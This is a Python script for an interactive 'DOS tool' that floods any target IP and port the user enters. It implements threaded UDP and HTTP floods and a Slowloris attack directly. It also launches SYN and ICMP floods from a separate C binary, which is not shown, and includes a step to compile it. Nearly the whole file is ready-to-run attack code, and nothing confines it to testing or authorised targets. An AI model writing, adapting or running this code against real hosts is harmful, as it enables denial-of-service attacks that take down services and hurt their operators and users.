#!/usr/bin/env python3
import os, sys, subprocess, shutil, socket, threading, time, random, struct

RED="\033[91m"; YEL="\033[93m"; CYN="\033[96m"; GRN="\033[92m"
WHT="\033[97m"; DIM="\033[2m";  RST="\033[0m"

LOGO = f"""{RED}
  ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗
  ██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
  ██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║
  ██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║
  ██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝{RST}
{DIM}                  [ denial of service attack tool ]{RST}
"""

MENU = f"""
{YEL}┌──────────────────────────────────────────────────────┐
│                {WHT}DOS ATTACK OPTIONS{YEL}                  │
├──────────────────────────────────────────────────────┤
│  {CYN}[1]{YEL}  UDP Flood             {DIM}(Python){YEL}             │
│  {CYN}[2]{YEL}  HTTP Flood            {DIM}(Python){YEL}             │
│  {CYN}[3]{YEL}  SYN Flood             {DIM}(C binary){YEL}           │
│  {CYN}[4]{YEL}  ICMP Flood            {DIM}(C binary){YEL}           │
│  {CYN}[5]{YEL}  Slowloris             {DIM}(Python){YEL}             │
│  {CYN}[6]{YEL}  Build C tool          {DIM}(gcc){YEL}                │
│  {CYN}[0]{YEL}  Back                                         │
└──────────────────────────────────────────────────────┘{RST}
"""

def clear(): os.system("clear")

# ── shared state ──────────────────────────────────────────────────────────────
running   = False
pkt_count = 0
pkt_lock  = threading.Lock()

def stats_printer(duration):
    start = time.time()
    while running and (time.time()-start) < duration:
        time.sleep(1)
        with pkt_lock:
            print(f"\r  {YEL}[sent]{RST} {GRN}{pkt_count:,}{RST} packets    ", end="", flush=True)
    print()

def get_target():
    ip   = input(f"  target IPv4: ").strip()
    port = input(f"  port [80]: ").strip() or "80"
    threads = input(f"  threads [50]: ").strip() or "50"
    dur  = input(f"  duration seconds [60]: ").strip() or "60"
    return ip, int(port), int(threads), int(dur)

# ── UDP flood ─────────────────────────────────────────────────────────────────
def _udp_worker(ip, port, dur):
    global pkt_count
    payload = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + dur
    while running and time.time() < end:
        try:
            sock.sendto(payload, (ip, port))
            with pkt_lock: pkt_count += 1
        except: pass
    sock.close()

def udp_flood():
    global running, pkt_count
    print(f"\n{CYN}[ UDP FLOOD ]{RST}")
    ip, port, n_threads, dur = get_target()
    running = True; pkt_count = 0
    print(f"\n{GRN}[+] flooding {ip}:{port} with {n_threads} threads for {dur}s{RST}\n")
    workers = [threading.Thread(target=_udp_worker, args=(ip,port,dur), daemon=True) for _ in range(n_threads)]
    for w in workers: w.start()
    stats_printer(dur)
    running = False
    for w in workers: w.join(timeout=2)
    print(f"\n{GRN}[+] done — total: {pkt_count:,}{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── HTTP flood ────────────────────────────────────────────────────────────────
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
    "curl/8.1.2",
]
PATHS = ["/", "/index.html", "/login", "/api/v1/status", "/search?q=a"]

def _http_worker(ip, port, dur):
    global pkt_count
    end = time.time() + dur
    while running and time.time() < end:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, port))
            path = random.choice(PATHS)
            ua   = random.choice(UA)
            req  = (f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n"
                    f"User-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n")
            s.send(req.encode())
            with pkt_lock: pkt_count += 1
            s.close()
        except: pass

def http_flood():
    global running, pkt_count
    print(f"\n{CYN}[ HTTP FLOOD ]{RST}")
    ip, port, n_threads, dur = get_target()
    running = True; pkt_count = 0
    print(f"\n{GRN}[+] flooding http://{ip}:{port} — {n_threads} threads {dur}s{RST}\n")
    workers = [threading.Thread(target=_http_worker, args=(ip,port,dur), daemon=True) for _ in range(n_threads)]
    for w in workers: w.start()
    stats_printer(dur)
    running = False
    for w in workers: w.join(timeout=2)
    print(f"\n{GRN}[+] done — requests: {pkt_count:,}{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── Slowloris ─────────────────────────────────────────────────────────────────
sockets_list = []
sl_lock = threading.Lock()

def _slowloris_init(ip, port, count):
    for _ in range(count):
        try:
            s = socket.socket(); s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {ip}\r\n".encode())
            with sl_lock: sockets_list.append(s)
        except: pass

def _slowloris_keep(ip, port, dur):
    global pkt_count
    end = time.time() + dur
    while running and time.time() < end:
        time.sleep(10)
        with sl_lock:
            dead = []
            for s in sockets_list:
                try:
                    s.send(f"X-header: {random.randint(1,9999)}\r\n".encode())
                    with pkt_lock: pkt_count += 1
                except: dead.append(s)
            for s in dead:
                sockets_list.remove(s)
                try:
                    ns = socket.socket(); ns.settimeout(4)
                    ns.connect((ip,port))
                    ns.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {ip}\r\n".encode())
                    sockets_list.append(ns)
                except: pass

def slowloris():
    global running, pkt_count
    print(f"\n{CYN}[ SLOWLORIS ]{RST}")
    ip   = input("  target IP: ").strip()
    port = int(input("  port [80]: ").strip() or "80")
    count = int(input("  socket count [500]: ").strip() or "500")
    dur  = int(input("  duration seconds [120]: ").strip() or "120")
    running = True; pkt_count = 0
    sockets_list.clear()
    print(f"\n{GRN}[+] opening {count} sockets to {ip}:{port}{RST}")
    _slowloris_init(ip, port, count)
    print(f"{GRN}[+] {len(sockets_list)} sockets open — keeping alive{RST}\n")
    t = threading.Thread(target=_slowloris_keep, args=(ip,port,dur), daemon=True)
    t.start()
    stats_printer(dur)
    running = False; t.join(timeout=5)
    print(f"\n{GRN}[+] done{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── C tool launchers ──────────────────────────────────────────────────────────
C_BIN = os.path.join(os.path.dirname(__file__), "dos_tool")
C_SRC = os.path.join(os.path.dirname(__file__), "dos_tool.c")

def _launch_c(mode):
    if not os.path.exists(C_BIN):
        print(f"{RED}[!] C binary not built — choose option 6 first{RST}")
        input(); return
    ip      = input("  target IP: ").strip()
    port    = input("  port [80]: ").strip() or "80"
    threads = input("  threads [100]: ").strip() or "100"
    dur     = input("  duration seconds [60]: ").strip() or "60"
    cmd = [C_BIN, mode, ip, port, threads, dur]
    print(f"\n{GRN}[+] launching: {' '.join(cmd)}{RST}\n")
    try: subprocess.run(cmd)
    except KeyboardInterrupt: pass
    input(f"\n{DIM}press enter{RST}")

def syn_flood():  _launch_c("syn")
def icmp_flood(): _launch_c("icmp")

def build_c():
    if not shutil.which("gcc"): print(f"{RED}[!] gcc not found{RST}"); input(); return
    r = subprocess.run(["gcc","-O2","-pthread","-o",C_BIN,C_SRC], capture_output=True)
    if r.returncode == 0: print(f"{GRN}[+] built: {C_BIN}{RST}")
    else: print(f"{RED}[!] build failed:\n{r.stderr.decode()}{RST}")
    input(f"\n{DIM}press enter{RST}")

ACTIONS={"1":udp_flood,"2":http_flood,"3":syn_flood,"4":icmp_flood,"5":slowloris,"6":build_c}

def main():
    while True:
        clear(); print(LOGO); print(MENU)
        c=input(f"{RED}dos{RST} {YEL}>{RST} ").strip()
        if c=="0": break
        if c in ACTIONS: ACTIONS[c]()
        else: input(f"{YEL}[?] invalid — enter{RST}")

if __name__=="__main__": main()
